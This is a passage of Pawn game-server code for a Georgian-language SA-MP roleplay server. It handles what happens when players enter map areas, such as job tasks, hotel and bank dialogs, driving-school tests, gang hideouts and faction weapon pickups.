			ClearAnimations(playerid);
			ApplyAnimation(playerid,"CAR_CHAT","CAR_Sc4_BL",4.0,1,1,1,0,20000,0);
			SetPlayerAttachedObject(playerid,0,18644,5,0.078999,0.042999,-0.012999,-3.299995,0.000000,0.000000);
			SetPlayerAttachedObject(playerid,1,18635,6);
			SetTimerEx("GunReady2",20000,false,"i",playerid);
		}
	}
	if(areaid == gAreas[arPoezd][0] || areaid == gAreas[arPoezd][1] || areaid == gAreas[arPoezd][2])
	{
		ShowPlayerDialog(playerid, dTeleport2, DIALOG_STYLE_LIST, "Marshuti [Fasi: 20$]", "1. Qalaqi LS (Sadguri)\n2. Qalaqi SF (Sadguri)\n3. Qalaqi LV (Sadguri)", "Archeva", "Daxurva");
	}
	if(areaid == gAreas[arKit])
	{
	    if(!pData[playerid][pCar] || (!pData[playerid][pHouse])) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gyavt Avtomobili");
	    if(pData[playerid][pDvijok] == 1) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Iyidet Kit.");
	    format(mes,sizeof(mes),"{ffffff}Tqven Gsurt Iyidot {"#cYELLOW"}Kit {ffffff}Avtomobilis {"#cGREEN"}%s {ffffff}?\nGirebuleba: {"#cGREEN"}%d$",gTransport[pData[playerid][pCar] - 400][trName],Dvijki(playerid));
	    ShowPlayerDialog(playerid,dBuyKit,0,"{"#cGREEN"}Shedzena: {ffffff}Kit (Dzravis)",mes,"YES","NO");
	}
	if(areaid == gAreas[arRecep]) ShowPlayerDialog(playerid, dRecep, DIALOG_STYLE_LIST, "{"#cYELLOW"}Reception", "{ffffff}1. Otaxis Yidva Sastumroshi [5000$]\n2. Otaxis Gayidva Sastumroshi", "Archeva", "Daxurva");
	if(areaid == gAreas[arGangJob])
	{
	    if(GetPVarInt(playerid,"gangjob") != 2) return true;
  		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Gadmodit Avtomobilidan");
		SetPVarInt(playerid,"gangjob",1);
		SendClientMessage(playerid,CYELLOW,"Velodebit, Ixsneba Saketi Da Iparavt Medikamentebs.");
		TogglePlayerControllable(playerid,0);
		SetCameraBehindPlayer(playerid);
 	    TextDrawShowForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
 	    SetTimerEx("GangJOB",15000,false,"i",playerid);
	}
	if(areaid == gAreas[arMafiaJob][0] || areaid == gAreas[arMafiaJob][1] || areaid == gAreas[arMafiaJob][2] || areaid == gAreas[arMafiaJob][3] || areaid == gAreas[arMafiaJob][4] || areaid == gAreas[arMafiaJob][5] || areaid == gAreas[arMafiaJob][6])
 	{
 	    if(GetPVarInt(playerid,"mafiajob") != 3) return true;
  		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Gadmodit Avtomobilidan");
		SetPVarInt(playerid,"mafiajob",7);
 	    SendClientMessage(playerid,CYELLOW,"Velodebit, Ixsneba Saketi.");
 	    TogglePlayerControllable(playerid,0);
		SetCameraBehindPlayer(playerid);
 	    TextDrawShowForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
 	    SetTimerEx("MafiaJOB",15000,false,"i",playerid);
 	}
 	if(areaid == gAreas[arMafiaJob1][0] || areaid == gAreas[arMafiaJob1][1] || areaid == gAreas[arMafiaJob1][2] || areaid == gAreas[arMafiaJob1][3] || areaid == gAreas[arMafiaJob1][4] || areaid == gAreas[arMafiaJob1][5] || areaid == gAreas[arMafiaJob1][6])
 	{
 	    if(GetPVarInt(playerid,"mafiajob") != 4) return true;
 	    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Gadmodit Avtomobilidan");
		SetPVarInt(playerid,"mafiajob",7);
		SendClientMessage(playerid,CYELLOW,"Shen: Gaumarjos, Ratom Gvemalebi?");
		SendClientMessage(playerid,CGREEN,"Mevale: Wadi Aqeda, Arafers Ar Mogcem.");
		SendClientMessage(playerid,CWHITE,"( Moxvda, Sacemad Daachiret Mausis Marcxena Mxares )");
		SendClientMessage(playerid,CWHITE,"( Cemet Is Manamde Sanam Fuls Ar Mogcemt )");

  		new Text:Textdraw0;
 	    new idf = RandomEx(20,25);

		Textdraw0 = TextDrawCreate(220.000000, 140.000000, "PHOTO");
		TextDrawBackgroundColor(Textdraw0, 255);
		TextDrawFont(Textdraw0, 5);
		TextDrawLetterSize(Textdraw0, 0.500000, 1.000000);
		TextDrawColor(Textdraw0, -1);
		TextDrawSetOutline(Textdraw0, 0);
		TextDrawSetProportional(Textdraw0, 1);
		TextDrawSetShadow(Textdraw0, 1);
		TextDrawTextSize(Textdraw0, 200.000000, 250.000000);
		TextDrawSetPreviewModel(Textdraw0, idf);
		TextDrawSetPreviewRot(Textdraw0, -16.000000, 0.000000, 0.000000, 1.000000);
		TextDrawSetSelectable(Textdraw0, 1);
		gInterfaceElement[C_ELEMENT_WANTED_PHOTO3] = Textdraw0;

		TextDrawShowForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
		TextDrawShowForPlayer(playerid,gInterfaceElement[C_ELEMENT_WANTED_PHOTO3]);
		SelectTextDraw(playerid,CYELLOW);
 	}
 	if(areaid == gAreas[arSeloLoad1] && GetPVarInt(playerid,"loadid") == 10 && GetPVarInt(playerid,"Work") == 5)
  	{
  	    ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
  	    SetPlayerAttachedObject(playerid, 2, 2384, 5, 0.01, 0.1, 0.2, 100, 10, 85);
  	    new idf = RandomEx(0,5);
		SetPlayerCheckpoint(playerid,gSeloCP[idf][0],gSeloCP[idf][1],gSeloCP[idf][2],1.2);
		SetPVarInt(playerid,"loadid",idf+1);
 	}
 	if(areaid == gAreas[arSeloLoad7] && GetPVarInt(playerid,"loadid") == 20 && GetPVarInt(playerid,"Work") == 5)
 	{
        if(GetPVarInt(playerid,"pOff9") > gettime()) SendClientMessage(playerid, 0xB85A1CFF, "Tqven Gaikiket Chetis Gamoyenebistvis. (#0040)"), NewKick(playerid);
        pTemp[playerid][pWorkSalary] += 80;
		format(mes,sizeof(mes),"Tansacmeli Daayena. {"#cGREEN"}+80$ {ffffff}Tqveni Xelpasi. Sul Gamomushavebuli: {"#cGREEN"}%d$",pTemp[playerid][pWorkSalary]);
		SendClientMessage(playerid,CWHITE,mes);
		RemovePlayerAttachedObject(playerid,2);
		ClearAnimations(playerid);
		SetPVarInt(playerid,"pOff7",1);
		SetPVarInt(playerid,"pOff9",gettime()+25);
		SetPVarInt(playerid,"loadid",10);

		new listitems[] = "1. Gamdzleoba (Stamina)\n2. Dzala (Power)";
		ShowPlayerDialog(playerid, dRabot, DIALOG_STYLE_LIST, "Gaumjobeseba", listitems, "Archeva", "Daxurva");
        SetPlayerCheckpoint(playerid,-41.0592,-189.0606,928.7820,1.2);
 	}
 	if((areaid == gAreas[arSeloLoad2] && GetPVarInt(playerid,"loadid") == 1) ||
	(areaid == gAreas[arSeloLoad3] && GetPVarInt(playerid,"loadid") == 2) ||
	(areaid == gAreas[arSeloLoad4] && GetPVarInt(playerid,"loadid") == 3) ||
	(areaid == gAreas[arSeloLoad5] && GetPVarInt(playerid,"loadid") == 4) ||
	(areaid == gAreas[arSeloLoad6] && GetPVarInt(playerid,"loadid") == 5) &&
    pstate == PLAYER_STATE_ONFOOT)
    {
        if(GetPVarInt(playerid,"Work") == 5 && !GetPVarInt(playerid,"woodamount"))
        {
            RemovePlayerAttachedObject(playerid,2);
            ClearAnimations(playerid);
 	    	ApplyAnimation(playerid,"CAR_CHAT","CAR_Sc4_BL",4.0,1,1,1,0,22000,0);
            SetTimerEx("SeloLoad",20000,false,"i",playerid);
        }
    }
    if((areaid == gAreas[arCoalmanLoad2] && GetPVarInt(playerid,"loadid") == 4) &&
    pstate == PLAYER_STATE_ONFOOT)
    {
        if(GetPVarInt(playerid,"Work") != 2) return true;
        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, CGRAY, "Gadmodit Avtomobilidan");
        if(GetPVarInt(playerid,"pOff9") > gettime()) SendClientMessage(playerid, 0xB85A1CFF, "Tqven Gaikiket Chetis Gamoyenebistvis. (#0040)"), NewKick(playerid);
        pTemp[playerid][pWorkSalary] += 50;
		format(mes,sizeof(mes),"Klasipicirebuli Chanta. {"#cGREEN"}+50$ {ffffff}Tqveni Xelpasi. Sul Gamomushavebuli: {"#cGREEN"}%d$",pTemp[playerid][pWorkSalary]);
		SendClientMessage(playerid,CWHITE,mes);
		RemovePlayerAttachedObject(playerid,2);
		ClearAnimations(playerid);
		SetPVarInt(playerid,"pOff7",1);
		SetPVarInt(playerid,"pOff9",gettime()+8);
		SetPVarInt(playerid,"loadid",10);

		new listitems[] = "1. Gamdzleoba (Stamina)\n2. Dzala (Power)";
		ShowPlayerDialog(playerid, dRabot, DIALOG_STYLE_LIST, "Gaumjobeseba", listitems, "Archeva", "Daxurva");
        SetPlayerCheckpoint(playerid,2486.4209,1934.9823,9.8399,1.2);
    }
	if((areaid == gAreas[arCoalmanLoad1] && GetPVarInt(playerid,"loadid") == 10) &&
    pstate == PLAYER_STATE_ONFOOT)
	{
	    if(GetPVarInt(playerid,"Work") == 2)
	    {
	        SetPVarInt(playerid,"loadid",4);
	        ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
	  		SetPlayerAttachedObject(playerid, 2, 2060, 5, 0.01, 0.1, 0.2, 100, 10, 85);
	  		SetPlayerCheckpoint(playerid,2412.1968,1926.2626,6.0156,4.0);
		}
	}
	if(areaid == gAreas[arGunWork] && pstate == PLAYER_STATE_ONFOOT)
	{
		if(GetPVarInt(playerid,"Work") == 0) ShowPlayerDialog(playerid,dGunWork,0,"Mogesalmebit","\n  {"#cWHITE"}Chven Gtavazobt Samushaos {"#cLIGHTBLUE"}Merkinigze.\n\t\t{"#cYELLOW"}Tanaxma Xart?","YES","NO");
		else if(GetPVarInt(playerid,"Work") == 4) ShowPlayerDialog(playerid,dGunWork,0,"Samushaos Dasruleba.","Gsurt Samushaos Dasruleba Da Fulis Ageba?","YES","NO");
	}
	if(areaid == gAreas[arZavodSklad2] && (pData[playerid][pFraction] == 8 || pData[playerid][pFraction] == 9))
	{
		SendClientMessage(playerid,CINFO,"Daachire {"#cWHITE"}'H' {"#cINFO"}, Rom Aigo Sabrdzolo Masala");
	}
	if(areaid == gAreas[arAutoExam])
	{
		ShowPlayerDialog(playerid,dExamType,2,"{"#cGREEN"}Avtoskola: {ffffff}Gamocda","{ffffff}Martvis Mowmoba [150$]","Archeva","Daxurva");
	}
	if (areaid >= gAreas[arGang][0] && areaid <= gAreas[arGang][4])
	{
		if(GetPVarInt(playerid,"JustTP") == 1)
		{
			SetPVarInt(playerid,"JustTP",0);
			return true;
		}
		new gangid = -1;
		for(new i;i<5;i++)
		{
			if(gAreas[arGang][i] == areaid) {gangid = i; break;}
		}
		if(gangid == -1) return true;
		if(GetPVarInt(playerid,"GangKey") == 0 && pData[playerid][pFraction] - 3 != gangid) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Karis Gasagebi.");
		SetPVarInt(playerid,"JustTP",1);
		SetPlayerInterior(playerid,5);
		SetPlayerVirtualWorld(playerid,gangid);
		SetPlayerPos(playerid,1294.6316,-823.7710,1624.9728);
		SetPlayerFacingAngle(playerid,90.0);
		TogglePlayerControllable(playerid,0);
		SetTimerEx("Unfreez",2000,false,"i",playerid);
		WHDataUpdate();
	}
	if(areaid == gAreas[arGangExit])
	{
		if(GetPVarInt(playerid,"JustTP") == 1)
		{
			SetPVarInt(playerid,"JustTP",0);
			return true;
		}
		SetPVarInt(playerid,"JustTP",1);
		new gangid = GetPlayerVirtualWorld(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerPos(playerid,gGangEnter[gangid][0],gGangEnter[gangid][1],gGangEnter[gangid][2]);
		SetPlayerFacingAngle(playerid,gGangEnter[gangid][3]);
	}
	if(areaid == gAreas[arDorm])
	{
		new gangid = GetPlayerVirtualWorld(playerid);
		new gunamount = GetPVarInt(playerid,"carrygun");
		new ammo = GetPVarInt(playerid,"carryammo");
		if(gunamount || ammo)
		{
			SetPVarInt(playerid,"carrygun",0);
			SetPVarInt(playerid,"carryammo",0);
			RemovePlayerAttachedObject(playerid,0);
			ApplyAnimation(playerid,"CARRY","putdwn",1.0,0,1,1,0,0,1);
			gGangDorm[gangid][0] += gunamount;
			gGangDorm[gangid][1] += ammo;
			WHDataUpdate();
		}
	}
	if(areaid == gAreas[arBank]) ShowPlayerDialog(playerid,dBank,2,"{"#cYELLOW"}Sabanko Momsaxureba","1. Balansi\n2. Tanxis Gamotana\n3. Tanxis Shetana\n4. Saxelmwifo Gadasaxadebi\n5. Biznesis Gadasaxadebi","Archeva","Uaryofa");
	if(areaid == gAreas[arHire])
	{
		if(pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Xart Organizaciis Wevri.");
		ShowPlayerDialog(playerid,dHire,2,"Samushao","1. Taqsisti\n2. Meqaniki","ОК","CLOSE");
	}
	if(areaid == gAreas[arCasino])
	{
		format(mes,sizeof(mes),"\t{"#cYELLOW"}Kazino\n\n{"#cWHITE"}Mflobeli: {"#cBLUE"}%s\n{"#cWHITE"}Fasi: {"#cGREEN"}%d",gCasino[0][casinoOwner],gCasino[0][casinoPrice]);
	    ShowPlayerDialog(playerid,dCasino,DIALOG_STYLE_MSGBOX,"{1B8E06}Kazino",mes,"Martva","Daxurva");
	}
	if(areaid == gAreas[arOtelBAR])
	{
	    if(pData[playerid][pOtelNomer] < 1) return SendClientMessage(playerid,CBLUE,"Tqven Ar Xart Sastumro Otaxis Mflobeli");
     	if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Ar Cxovrobt Am Sastumroshi");
	    SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,1951,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
        SetPlayerSpecialAction(playerid, 0);
		ClearAnimations(playerid);
		RemovePlayerAttachedObject(playerid,0);
		ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
		MeAction(playerid,"Dalia Soda");
		if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 50;
	}
	if(areaid == gAreas[arOtelHP])
	{
	    if(pData[playerid][pOtelNomer] < 1) return SendClientMessage(playerid,CBLUE,"Tqven Ar Xart Sastumro Otaxis Mflobeli");
     	if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Ar Cxovrobt Am Sastumroshi");
	    new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 100) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gsurt Chama.");
		pTemp[playerid][pEat] = 2 + 4;
		SendClientMessage(playerid, -1, "Dawere {"#cINFO"}/eat{"#cWHITE"}, Rom Shechamo.");
		SetPlayerSpecialAction(playerid, 25), SetPlayerAttachedObject(playerid,0,gEateryObj[2],3,0.232999,-0.376998,-0.408999,54.199886,-35.700153,-35.000019,1.000000,1.000000,1.000000);
	}
	if(areaid == gAreas[arTyrmaHP])
	{
	    new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 100) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gsurt Chama.");
		pTemp[playerid][pEat] = 2 + 4;
		SendClientMessage(playerid, -1, "Dawere {"#cINFO"}/eat{"#cWHITE"}, Rom Shechamo.");
		SetPlayerSpecialAction(playerid, 25), SetPlayerAttachedObject(playerid,0,gEateryObj[2],3,0.232999,-0.376998,-0.408999,54.199886,-35.700153,-35.000019,1.000000,1.000000,1.000000);
	}
	if(areaid == gAreas[arPoezdExit])
	{
	    switch(GetPVarInt(playerid,"Busser"))
		{
		    case 0: SetPlayerPos(playerid, 1706.5212,-1949.0205,14.1172);
			case 1: SetPlayerPos(playerid, -1952.3473,175.9786,26.2813);
			case 2: SetPlayerPos(playerid, 2857.7715,1320.6125,11.3906);
		}
		SetPlayerInterior(playerid,0);
	 	SetPlayerVirtualWorld(playerid,0);
	}
	if(areaid == gAreas[arYniver][0])
	{
	    if(pData[playerid][pObraz1] >= 100) return SendClientMessage(playerid,CGRAY,"Tqven Davalebas Vegar Sheasrulebt. Tqven Migebuligaqvt Ganatleba.");
        SetPVarInt(playerid,"yrok",1);
        SetPlayerPos(playerid, -99.1701,-12.9903,1151.1399);
        SetPlayerFacingAngle(playerid,78.5541);
        ClearAnimations(playerid);
		GameTextForPlayer(playerid, "~y~Daelode 20 Wami", 20000, 1);
		ApplyAnimation(playerid,"GRAFFITI","spraycan_fire",4.0,1,1,1,0,22000,0);
		SetTimerEx("Kniga",20000,false,"i",playerid);
	}
	if(areaid == gAreas[arYniver][1])
	{
	    if(pData[playerid][pObraz3] >= 100) return SendClientMessage(playerid,CGRAY,"Tqven Davalebas Vegar Sheasrulebt. Tqven Migebuligaqvt Ganatleba.");
        SetPVarInt(playerid,"yrok",2);
        SetPlayerPos(playerid, -80.2177,-23.7515,1151.1399);
        SetPlayerFacingAngle(playerid,180.3651);
        ClearAnimations(playerid);
		GameTextForPlayer(playerid, "~y~Daelode 20 Wami.~n~~p~Warmatebuli Gakvetili", 20000, 1);
		ApplyAnimation(playerid,"GRAFFITI","spraycan_fire",4.0,1,1,1,0,22000,0);
		SetTimerEx("Kniga",20000,false,"i",playerid);
	}
	if(areaid == gAreas[arYniver][2])
	{
	    if(pData[playerid][pObraz4] >= 100) return SendClientMessage(playerid,CGRAY,"Tqven Davalebas Vegar Sheasrulebt. Tqven Migebuligaqvt Ganatleba.");
        SetPVarInt(playerid,"yrok",3);
        SetPlayerPos(playerid, -71.6005,-20.7362,1151.1399);
        SetPlayerFacingAngle(playerid,189.4284);
        ClearAnimations(playerid);
		GameTextForPlayer(playerid, "~y~Daelode 20 Wami.~n~~p~Warmatebuli Gakvetili", 20000, 1);
		ApplyAnimation(playerid,"GRAFFITI","spraycan_fire",4.0,1,1,1,0,22000,0);
		SetTimerEx("Kniga",20000,false,"i",playerid);
	}
	if(areaid == gAreas[arGangWeap])
	{
	    new gangid = pData[playerid][pFraction] - 3;
		if(GetPlayerVirtualWorld(playerid) != gangid) return true;
		if(!pData[playerid][pAmmo]) return SendClientMessage(playerid,CGRAY,"Shen Argaqvs Tyviebi");
		ShowMakeGunList(playerid);
	}
	if(areaid == gAreas[arPDD])
	{
	   	new string[1200];
		strcat(string,"\t\t{ffff00}Modzraobis Wesebi:\n\n\n");
	  	strcat(string,"\t{34c924}Tavi Pirveli. Maximaluri Sichqare Da Parkingi!\n\n");
	  	strcat(string,"{cd5c5c}1.1 {ffffff}Qalaqshi Dashvebulia Maximaluri Sichqare: 90Km/h.\n");
	  	strcat(string,"{cd5c5c}1.2 {ffffff}Qalaq Garet Dashvebulia Maximaluri Sichqare: 120 Kmh/h.\n");
	  	strcat(string,"{cd5c5c}1.3 {ffffff}Avtomobilis Sajarimoze Gadakvana Xdeba Rodesac: Manqana Ar Ayenia Parkingze.\n\n");
	  	strcat(string,"\t{34c924}Tavi Meore. Modzraobis Dziritadi Wesebi.\n\n");
	  	strcat(string,"{cd5c5c}2.1 {ffffff}Dausaxlebel Punqtshi Xmovani Signali Shegidzliat Gamoiyenot: Avariis Tavidan Acilebis Miznit.\n");
	  	strcat(string,"{cd5c5c}2.2 {ffffff}Dasaxlebul Punqtshi Xmovani Signali Shegidzliat Gamoiyenot: Avariis Tavidan Acilebis Miznit.\n");
	  	strcat(string,"{cd5c5c}2.3 {ffffff}Avtomagistralze Ukusvlit Modzraoba: Ar Sheidzleba.\n");
	  	strcat(string,"{cd5c5c}2.5 {ffffff}Motociklit Modzraobisas: Mdzgols Da Mgzavrs Unda Exurot Shekruli Chapxuti.\n");
        strcat(string,"{cd5c5c}2.6 {ffffff}Ra Dros Unda Chartos Mdzgolma Cimcima: Moxvevis Dros.\n");
        strcat(string,"{cd5c5c}2.7 {ffffff}Sheudzlia Tu Ara Mdzgols Uwyveti Zolidan Abgonze Gasvla: Ara.\n");
  		strcat(string,"{cd5c5c}2.8 {ffffff}Saburavis Gzastan Mochidebis Dzala,Sichqaris Gazrdisas: Mcirdeba.\n\n");
	  	strcat(string,"\t{34c924}Tavi Mesame. Usafrtxoeba.\n\n");
	  	strcat(string,"{cd5c5c}3.1 {ffffff}Saburavis Gzastan Mochidebis Dzala,Sichqaris Gazrdisas: Mcirdeba.\n");
	  	strcat(string,"{cd5c5c}3.2 {ffffff}Avtomobilis Ukana Tvlebi Mosaxvevshi Modzraobis Dros Gadaadgildeba: Mosaxvevis Centrisken.\n");
	  	strcat(string,"{cd5c5c}3.3 {ffffff}Nislis Dros Modzraobisas Mandzili Sagnebamde Gvechveneba: Meti Vidre Sinamdvileshia.\n");
	  	ShowPlayerDialog(playerid,dMes,0,"{1B8E06}PDD",string,"Gasagebia","");
	}
	if(areaid == gAreas[arPDD1])
 	{
 	    if(GetPVarInt(playerid,"examen") != 2) return true;
 	    ShowPlayerDialog(playerid,dAutoExam3,0,"Avtoskola","{"#cWHITE"}Axla Tqven Mogetxovebat Gaiarot Testi.\nRom Miigo Praqtikuli Gamocdis Ufleba","NEXT","CLOSE");
	}
	if(areaid == gAreas[arGangHP])
	{
	    new gangid = pData[playerid][pFraction] - 3;
		if(GetPlayerVirtualWorld(playerid) != gangid) return true;
		if(gGangDorm[gangid][2] < 1) return SendClientMessage(playerid,CGRAY,"Sacavshi Ar Aris Sakmarisi Medikamentebi.");
		new Float:health;
		GetPlayerHealth(playerid,health);
		if(health >= 100) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Sakmarisad Janmrteli Xart.");
		gGangDorm[gangid][2] -= 1;
		new query[180];
		format(query,sizeof(query),"UPDATE `gangs` SET `aptek` = '%d' WHERE `id` = '%d'",gGangDorm[gangid][2],gangid+1);
		mysql_empty(mysql, query);
		SetPlayerHealthEx(playerid,100.0);
		MeAction(playerid,"Sheixvia Chriloba Bintit");
		WHDataUpdate();
	}
	if(areaid == gAreas[arMafiaAmmo])
	{
	    if(IsAMafia(playerid))
	    {
	        GivePlayerWeaponEx(playerid,24,100);
			SetPlayerHealthEx(playerid,100.0);
			GivePlayerWeaponEx(playerid,30,100);
	    }
	}
	if(areaid == gAreas[arMeriyaAmmo])
	{
	    if(pData[playerid][pFraction] == 15)
	    {
	        GivePlayerWeaponEx(playerid,24,300);
			SetPlayerHealthEx(playerid,100.0);
			SetPlayerArmourEx(playerid,100.0);
	        GivePlayerWeaponEx(playerid,3,1);
			GivePlayerWeaponEx(playerid,29,500);
			SetPlayerArmedWeapon(playerid,23);
			SendClientMessage(playerid,CGRAY,"Tqven Aiget Sabrdzolo Masala, Dubinka, Bronjileti, Iaragi.");
	    }
	}
	if(areaid == gAreas[arFbiAmmo])
	{
	    if(pData[playerid][pFraction] == 11)
	    {
	        GivePlayerWeaponEx(playerid,17,3);
	        GivePlayerWeaponEx(playerid,24,300);
			SetPlayerHealthEx(playerid,100.0);
			SetPlayerArmourEx(playerid,100.0);
	        GivePlayerWeaponEx(playerid,3,1);
			GivePlayerWeaponEx(playerid,29,500);
			SetPlayerArmedWeapon(playerid,23);
			if(GetPlayerAmmo(playerid) > 0 && GetPlayerWeapon(playerid) == 23) SetPlayerAmmoEx(playerid,2,0);
			GivePlayerWeaponEx(playerid,23,60);
			SetPVarInt(playerid,"TazerGun",1);
			SendClientMessage(playerid,CGRAY,"Tqven Aiget Sabrdzolo Masala, Dubinka, Bronjileti, Electroshoki Da Sakvebi");
	    }
	}
	if(areaid == gAreas[arArmyAmmo])
	{
		new armyid = GetPlayerVirtualWorld(playerid);
		if(pData[playerid][pFraction] == 8 || pData[playerid][pFraction] == 9)
		{
			new gunamount = GetPVarInt(playerid,"carrygun");
			new ammo = GetPVarInt(playerid,"carryammo");
			if(gunamount || ammo)
			{
				SetPVarInt(playerid,"carrygun",0);
				SetPVarInt(playerid,"carryammo",0);
				RemovePlayerAttachedObject(playerid,0);
				ApplyAnimation(playerid,"CARRY","putdwn",1.0,0,1,1,0,0,1);
				if(armyid < 2)
				{
					if(gArmyWarehouse[armyid][0] + gunamount > 100000) return SendClientMessage(playerid,CGRAY,"Sacavshi Agar Aris Sakmarisi Adgili Sabrdzolo Masalistvis");
					else gArmyWarehouse[armyid][0] += gunamount;
					if(gArmyWarehouse[armyid][1] + ammo > 100000) return SendClientMessage(playerid,CGRAY,"Sacavshi Agar Aris Sakmarisi Adgili Tyviebistvis");
					else gArmyWarehouse[armyid][1] += ammo;
				}
				else
				{
					new pdid = armyid - 2;
					if(gPDWarehouse[pdid][0] + gunamount > 50000) SendClientMessage(playerid,CGRAY,"Sacavshi Ar Aris Sakmarisi Adgili");
					else gPDWarehouse[pdid][0] += gunamount;
					if(gPDWarehouse[pdid][1] + ammo > 50000) SendClientMessage(playerid,CGRAY,"Sacavshi Agar Aris Sakmarisi Adgili Tyviebistvis");
					else gPDWarehouse[pdid][1] += ammo;
				}
				WHDataUpdate();
			}
			else
			{
				if(GetPVarInt(playerid,"takegun") == 1) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Aiget Sabrdzolo Masala.");
				SetPVarInt(playerid,"takegun",1);
				if(armyid < 2)
				{
					if(gArmyWarehouse[armyid][0] < 300 || gArmyWarehouse[armyid][1] < 135) return SendClientMessage(playerid,CGRAY,"Sacavshi Ar Aris Sakmarisi Sabrdzolo Masala");
					gArmyWarehouse[armyid][0] -= 300;
					gArmyWarehouse[armyid][1] -= 135;
				}
				else
				{
					new pdid = armyid - 2;
					if(gPDWarehouse[pdid][0] < 300 || gPDWarehouse[pdid][1] < 135) return SendClientMessage(playerid,CGRAY,"Sacavshi Ar Aris Sakmarisi Sabrdzolo Masala");
					gPDWarehouse[pdid][0] -= 300;
					gPDWarehouse[pdid][1] -= 135;
				}
				WHDataUpdate();
				GivePlayerWeaponEx(playerid,24,300);
				SetPlayerHealthEx(playerid,100.0);
				SetPlayerArmourEx(playerid,100.0);
				if(pData[playerid][pFraction] == 9)
				{
				    GivePlayerWeaponEx(playerid,17,3);
					GivePlayerWeaponEx(playerid,3,1);
					GivePlayerWeaponEx(playerid,29,500);
					SetPlayerArmedWeapon(playerid,23);
					if(GetPlayerAmmo(playerid) > 0 && GetPlayerWeapon(playerid) == 23) SetPlayerAmmoEx(playerid,2,0);
					GivePlayerWeaponEx(playerid,23,60);
					SetPVarInt(playerid,"TazerGun",1);
					SendClientMessage(playerid,CGRAY,"Tqven Aiget Sabrdzolo Masala, Dubinka, Bronjileti, Electroshoki Da Sakvebi");
				}
				else
				{
					GivePlayerWeaponEx(playerid,31,100);
					SendClientMessage(playerid,CGRAY,"Tqven Aiget Sabrdzolo Masala, Bronjileti Da Sakvebi");
				}
			}
		}
		else if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 8 && armyid < 3) SendClientMessage(playerid,CINFO,"Daachire {"#cWHITE"}'H' {"#cINFO"}, Rom Aigot Sabrdzolo Masala");
	}
	else //Циклы проверок
	{
		if(pData[playerid][pFraction] == 8 || pData[playerid][pFraction] == 9 || IsGang(pData[playerid][pFraction] ))
		{
			for(new i;i<MAX_VEHICLES;i++)
			{
				if(areaid == gVehicleGun[i][vGunArea])
				{
					new vehicleid = i;
					//if(vehicleid >= aArmy1[0] && vehicleid <= aArmy2[1] && pData[playerid][pFraction] != 8 && !IsGang(pData[playerid][pFraction])) return SendClientMessage(playerid,CWHITE,"Stop 1");;
					if(gVehicleGun[i][vGunLoading] == true && (GetPVarInt(playerid,"carrygun") || GetPVarInt(playerid,"carryammo")))
					{
						new gunamount = GetPVarInt(playerid,"carrygun");
						new ammo = GetPVarInt(playerid,"carryammo");
						SetPVarInt(playerid,"carrygun",0);
						SetPVarInt(playerid,"carryammo",0);
						RemovePlayerAttachedObject(playerid,0);
						ApplyAnimation(playerid,"CARRY","putdwn",1.0,0,1,1,0,0,1);
						if(gVehicleGun[i][vGunGunAmount] + gunamount > 20000 || gVehicleGun[i][vGunAmmo] + ammo > 20000) return SendClientMessage(playerid,CGRAY,"Avtomobilshi Ar Aris Sakmaris Adgili");
						if(gunamount) gVehicleGun[i][vGunGunAmount] += gunamount;
						if(ammo) gVehicleGun[i][vGunAmmo] += ammo;
						format(mes,sizeof(mes),"Metali: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gVehicleGun[vehicleid][vGunGunAmount],gVehicleGun[vehicleid][vGunAmmo]);
						UpdateDynamic3DTextLabelText(gVehicleGun[i][vGunText],CWHITE,mes);
					}
					else if(gVehicleGun[i][vGunUnloading] == true && !GetPVarInt(playerid,"carrygun") && !GetPVarInt(playerid,"carryammo"))
					{
						if(gVehicleGun[i][vGunGunAmount] < 200 && gVehicleGun[i][vGunAmmo] < 200) return SendClientMessage(playerid,CGRAY,"Avtomobilshi Ar Aris Sakmarisi Sabrdzolo Masala");
						if(gVehicleGun[i][vGunGunAmount] >= 200)
						{
							gVehicleGun[i][vGunGunAmount] -= 200;
							SetPVarInt(playerid,"carrygun",200);
						}
						if(gVehicleGun[i][vGunAmmo] >= 200)
						{
							gVehicleGun[i][vGunAmmo] -= 200;
							SetPVarInt(playerid,"carryammo",200);
						}
						format(mes,sizeof(mes),"Metali: {"#cGREEN"}%d\n{"#cWHITE"}Tyviebi: {"#cGREEN"}%d",gVehicleGun[vehicleid][vGunGunAmount],gVehicleGun[vehicleid][vGunAmmo]);
						UpdateDynamic3DTextLabelText(gVehicleGun[i][vGunText],CWHITE,mes);
						//ClearAnimations(playerid);
